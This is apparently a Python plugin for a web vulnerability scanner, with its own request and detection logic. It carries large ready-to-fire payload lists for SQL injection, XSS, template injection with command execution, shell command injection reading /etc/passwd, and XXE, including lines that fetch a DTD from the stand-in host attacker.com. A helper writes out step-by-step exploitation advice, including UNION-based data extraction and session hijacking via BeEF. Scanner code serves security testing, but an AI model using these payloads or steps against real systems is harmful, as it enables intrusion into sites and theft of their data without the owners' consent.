"""
Plugin: VulnScanPlugin
Detects real-world web vulnerabilities (SQLi, XSS, SSTI, XXE, etc.)
Author: sud0x.dev@proton.me | License: MIT
"""

import asyncio
import aiohttp
import logging
import re
import json
import os
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)
PLUGIN_CLASS_NAME = "VulnScanPlugin"

class VulnScanPlugin:
    """Advanced vulnerability scanning: SQLi, XSS, SSTI, XXE, Command Injection"""
    
    def __init__(self):
        """Initialize vulnerability scanner with exploit database and advanced features"""
        # Advanced SQL injection payloads - real world effective
        self.sqli_payloads = [
            # Updated payload collection
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
            "' UNION SELECT 1,2,3,4,5,CONCAT(0x7e,user(),0x7e,database(),0x7e,version(),0x7e),7,8--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--",
            "' OR (SELECT*FROM(SELECT name_const(version(),1),name_const(version(),1))x)--",
            "' UNION SELECT 1,2,3,4,HEX(user()),6,7,8--",
            "' AND EXP(~(SELECT*FROM(SELECT user())x))--",
            "' AND GTID_SUBSET(version(),1)--",
            "' OR JSON_KEYS((SELECT CONVERT((SELECT user()) USING utf8)))--",
            "' AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT user())x)y))--",
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # NoSQL injection
            "'||'1'='1",
            "'; return true; var x='1",
            # Second-order SQL injection
            "admin' UNION SELECT 'admin',md5('password'),1--",
            # Advanced bypass techniques
            "' /*!50000OR*/ 1=1--",
            "' %26%26 1=1--",
            "' %7C%7C 1=1--"
        ]
        
        # Advanced XSS payloads - effective against real applications
        self.xss_payloads = [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            # Event handlers
            "<img src='x' onerror=alert('XSS');>",
            "<svg/onload=alert('XSS')>",
            "<button onclick='alert(1)'>Click Me</button>",
            "<input type='text' value='' onfocus='alert(1)'>",
            # Context breaking
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<title></title><script>alert('XSS')</script>",
            # Bypass filters
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<svg/onload=alert(/XSS/)",
            "javascript:alert('XSS')",
            # DOM-based XSS
            "#<script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            # More advanced
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>"
        ]
        
        # Server-Side Template Injection payloads
        self.ssti_payloads = [
            # Jinja2/Flask
            "{{7*7}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Twig
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}",
            # Smarty
            "{7*7}",
            "{php}echo `id`;{/php}",
            # Freemarker
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
        ]
        
        # Command injection payloads
        self.command_injection_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1"
        ]
        
        # XXE payloads
        self.xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;%intern;%trick;]><test>test</test>'
        ]
        
        # NoSQL injection payloads
        self.nosql_payloads = [
            "'||'1'=='1",
            "'; return true; var x='",
            "admin'||'a'=='a",
            "1; return true",
            "true, $where: '1 == 1'",
            "', $or: [ {}, { 'a':'a"
        ]
        
        # Common vulnerable paths
        self.vuln_paths = [
            "/admin", "/administrator", "/wp-admin", "/phpmyadmin",
            "/manager/html", "/config.php", "/.env", "/backup",
            "/test", "/dev", "/debug", "/api", "/v1", "/v2",
            "/swagger", "/docs", "/documentation", "/.git",
            "/database", "/db", "/sql", "/backup.sql"
        ]

        # Load vulnerability knowledge base
        self.vulnerability_db = self._load_vulnerability_db()
        
        # Load exploit database
        self.exploit_db = self._load_exploit_db()
        
        # Initialize advanced scanner (commenting out for now due to circular import)
        # from .vuln.advanced_scanner import AdvancedVulnerabilityScanner
        # self.advanced_scanner = AdvancedVulnerabilityScanner()
        
        # Error patterns that might indicate vulnerabilities
        self.error_patterns = {
            'sql_error': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'MySQLSyntaxErrorException',
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_.*',
                r'valid PostgreSQL result',
                r'ORA-[0-9][0-9][0-9][0-9]',
                r'Microsoft OLE DB Provider for ODBC Drivers',
                r'Microsoft JET Database Engine',
                r'ADODB.Field error'
            ],
            'php_error': [
                r'Warning.*include.*',
                r'Warning.*require.*',
                r'Fatal error.*',
                r'Parse error.*',
                r'Notice.*Undefined.*'
            ],
            'asp_error': [
                r'Microsoft VBScript runtime error',
                r'ASP.NET.*error',
                r'System.Data.OleDb.OleDbException'
            ]
        }
    
    def _load_vulnerability_db(self):
        """Load vulnerability knowledge base from data directory"""
        try:
            data_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'vulnerabilities.json')
            with open(data_path, 'r') as file:
                return json.load(file)
        except Exception as e:
            logger.warning(f"Failed to load vulnerability database: {e}")
            return []
    
    def _load_exploit_db(self):
        """Load exploit database from data directory"""
        try:
            data_path = os.path.join(os.path.dirname(__file__), '..', 'data', 'exploits_db.json')
            with open(data_path, 'r') as file:
                return json.load(file)
        except Exception as e:
            logger.warning(f"Failed to load exploit database: {e}")
            return {}
    
    def get_exploit_suggestions(self, vuln_type: str, target_url: str) -> Dict[str, Any]:
        """Get exploit suggestions for a specific vulnerability type"""
        suggestions = {
            'payloads': [],
            'tools': [],
            'exploitation_steps': [],
            'references': []
        }
        
        if vuln_type.lower() in ['sql injection', 'sqli']:
            suggestions['payloads'] = [
                self.exploit_db.get('sql_injection', {}).get('union_based', {}).get('detection', [])[:3],
                self.exploit_db.get('sql_injection', {}).get('error_based', {}).get('mysql', [])[:2],
                self.exploit_db.get('sql_injection', {}).get('time_based', [])[:2]
            ]
            suggestions['tools'] = ['sqlmap', 'NoSQLMap', 'jSQL Injection']
            suggestions['exploitation_steps'] = [
                f"1. Test basic SQL injection: {target_url}?id=1' OR '1'='1--",
                f"2. Enumerate columns: {target_url}?id=1' UNION SELECT NULL,NULL,NULL--",
                f"3. Extract data: {target_url}?id=1' UNION SELECT user(),database(),version()--",
                "4. Use automated tools like sqlmap for complete exploitation"
            ]
            suggestions['references'] = [
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://portswigger.net/web-security/sql-injection'
            ]
        
        elif vuln_type.lower() in ['xss', 'cross-site scripting']:
            suggestions['payloads'] = self.exploit_db.get('xss', {}).get('basic', [])[:3]
            suggestions['tools'] = ['XSSStrike', 'Xenotix XSS Exploit Framework', 'BeEF']
            suggestions['exploitation_steps'] = [
                f"1. Test basic XSS: {target_url}?q=<script>alert('XSS')</script>",
                f"2. Test event handlers: {target_url}?q=<img src=x onerror=alert('XSS')>",
                "3. Use BeEF for advanced exploitation and session hijacking"
            ]
            suggestions['references'] = [
                'https://owasp.org/www-community/attacks/xss/',
                'https://portswigger.net/web-security/cross-site-scripting'
            ]
        
        elif vuln_type.lower() in ['directory traversal', 'path traversal']:
            suggestions['payloads'] = self.exploit_db.get('lfi_rfi', {}).get('linux', [])[:3]
            suggestions['tools'] = ['DotDotPwn', 'fimap', 'LFISuite']
            suggestions['exploitation_steps'] = [
                f"1. Test basic traversal: {target_url}?file=../../../../etc/passwd",
                f"2. Try Windows paths: {target_url}?file=..\\..\\..\\windows\\win.ini",
                "3. Look for log poisoning opportunities"
            ]
            suggestions['references'] = [
                'https://owasp.org/www-community/attacks/Path_Traversal',
                'https://portswigger.net/web-security/file-path-traversal'
            ]
        
        return suggestions
    
    async def scan(self, target: str, timeout: int = 10, **kwargs) -> List[Dict[str, Any]]:
        """Run comprehensive vulnerability scan on target"""
        logger.info(f"Starting advanced vulnerability scan on {target}")
        
        vulnerabilities = []
        
        # Ensure target has protocol
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        # Determine scan methods from kwargs
        scan_methods = kwargs.get('methods', ['sql_injection', 'xss', 'ssti', 'command_injection', 'xxe', 'directory_traversal'])
        concurrency = kwargs.get('concurrency', 10)
        
        try:
            # Use advanced scanner for comprehensive testing (commented out for initial testing)
            # adv_vulnerabilities = await self.advanced_scanner.scan_target(
            #     target, 
            #     methods=scan_methods, 
            #     concurrency=concurrency
            # )
            # vulnerabilities.extend(adv_vulnerabilities)
            
            # Legacy scanning for additional checks
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=timeout),
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                
                # Check for exposed files/directories
                exposure_vulns = await self._check_exposed_files(session, target)
                vulnerabilities.extend(exposure_vulns)
                
                # Check for security headers
                header_vulns = await self._check_security_headers(session, target)
                vulnerabilities.extend(header_vulns)
        
        except Exception as e:
            logger.error(f"Advanced vulnerability scan error for {target}: {e}")
        
        logger.info(f"Advanced scan completed. Found {len(vulnerabilities)} vulnerabilities on {target}")
        return vulnerabilities
    
    async def _check_sql_injection(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Check for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Test most common parameters (reduced for speed)
        test_params = ['id', 'page', 'search', 'q']
        
        for param in test_params:
            for payload in self.sqli_payloads[:3]:  # Limit payloads for speed
                try:
                    test_url = f"{target}?{param}={payload}"
                    async with session.get(test_url, allow_redirects=False) as response:
                        content = await response.text()
                        
                        # Check for SQL error patterns
                        for error_type, patterns in self.error_patterns.items():
                            if error_type == 'sql_error':
                                for pattern in patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        exploit_suggestions = self.get_exploit_suggestions('SQL Injection', test_url)
                                        vulnerabilities.append({
                                            'type': 'SQL Injection',
                                            'severity': 'high',
                                            'target': test_url,
                                            'description': f'Possible SQL injection via parameter "{param}" with payload: {payload[:30]}...',
                                            'evidence': pattern,
                                            'exploit_suggestions': exploit_suggestions
                                        })
                                        break
                        
                        # Check for time-based or boolean-based indicators
                        if response.status == 500 or "error" in content.lower():
                            # Additional check for potential SQLi
                            original_url = f"{target}?{param}=1"
                            try:
                                async with session.get(original_url) as orig_response:
                                    if orig_response.status != response.status:
                                        exploit_suggestions = self.get_exploit_suggestions('SQL Injection', test_url)
                                        vulnerabilities.append({
                                            'type': 'SQL Injection',
                                            'severity': 'medium',
                                            'target': test_url,
                                            'description': f'Potential SQL injection detected via parameter "{param}" - different response codes',
                                            'evidence': f'Original: {orig_response.status}, Payload: {response.status}',
                                            'exploit_suggestions': exploit_suggestions
                                        })
                            except Exception:
                                pass
                
                except Exception:
                    continue
                
                # Add small delay to avoid overwhelming the server
                await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def _check_xss(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Check for XSS vulnerabilities"""
        vulnerabilities = []
        
        test_params = ['q', 'search', 'name']
        
        for param in test_params:
            for payload in self.xss_payloads[:2]:  # Limit payloads for speed
                try:
                    test_url = f"{target}?{param}={payload}"
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check if payload is reflected in response
                        if payload in content:
                            exploit_suggestions = self.get_exploit_suggestions('Cross-Site Scripting (XSS)', test_url)
                            vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'medium',
                                'target': test_url,
                                'description': f'Reflected XSS found via parameter "{param}"',
                                'evidence': f'Payload "{payload[:50]}..." reflected in response',
                                'exploit_suggestions': exploit_suggestions
                            })
                
                except Exception:
                    continue
                
                await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def _check_directory_traversal(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Check for directory traversal vulnerabilities"""
        vulnerabilities = []
        
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd"
        ]
        
        test_params = ['file', 'path', 'page']
        
        for param in test_params:
            for payload in traversal_payloads[:2]:  # Limit payloads for speed
                try:
                    test_url = f"{target}?{param}={payload}"
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for signs of successful traversal
                        if any(indicator in content.lower() for indicator in ['root:x:', 'daemon:', '[boot loader]', '127.0.0.1']):
                            exploit_suggestions = self.get_exploit_suggestions('Directory Traversal', test_url)
                            vulnerabilities.append({
                                'type': 'Directory Traversal',
                                'severity': 'high',
                                'target': test_url,
                                'description': f'Directory traversal vulnerability via parameter "{param}"',
                                'evidence': 'System file contents detected in response',
                                'exploit_suggestions': exploit_suggestions
                            })
                
                except Exception:
                    continue
                
                await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def _check_exposed_files(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Check for exposed sensitive files and directories"""
        vulnerabilities = []
        
        # Check expanded critical paths for comprehensive coverage
        critical_paths = [
            '/admin', '/.env', '/backup', '/.git', '/config.php', '/phpmyadmin',
            '/swagger', '/graphql', '/actuator', '/.DS_Store', '/robots.txt',
            '/web.config', '/composer.json', '/package.json', '/Dockerfile'
        ]
        for path in critical_paths:
            try:
                test_url = urljoin(target, path)
                async with session.get(test_url, allow_redirects=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        severity = 'medium'
                        description = f'Exposed path: {path}'
                        
                        # Determine severity based on path
                        if any(sensitive in path for sensitive in ['.env', '.git', 'config', 'backup', 'database']):
                            severity = 'high'
                            description = f'Sensitive file/directory exposed: {path}'
                        elif any(admin in path for admin in ['admin', 'manager', 'phpmyadmin']):
                            severity = 'medium'
                            description = f'Administrative interface exposed: {path}'
                        
                        vulnerabilities.append({
                            'type': 'Information Disclosure',
                            'severity': severity,
                            'target': test_url,
                            'description': description,
                            'evidence': f'HTTP {response.status} response received'
                        })
            
            except Exception:
                continue
            
            await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def _check_security_headers(self, session: aiohttp.ClientSession, target: str) -> List[Dict[str, Any]]:
        """Check for missing security headers"""
        vulnerabilities = []
        
        try:
            async with session.get(target) as response:
                headers = response.headers
                
                # Check for missing security headers
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection missing',
                    'X-Content-Type-Options': 'MIME type sniffing protection missing',
                    'X-XSS-Protection': 'XSS protection header missing',
                    'Strict-Transport-Security': 'HSTS header missing (HTTPS only)',
                    'Content-Security-Policy': 'CSP header missing'
                }
                
                for header, description in security_headers.items():
                    if header not in headers:
                        # Special case for HSTS - only relevant for HTTPS
                        if header == 'Strict-Transport-Security' and not target.startswith('https://'):
                            continue
                        
                        vulnerabilities.append({
                            'type': 'Missing Security Header',
                            'severity': 'low',
                            'target': target,
                            'description': description,
                            'evidence': f'"{header}" header not present in response'
                        })
        
        except Exception:
            pass
        
        return vulnerabilities
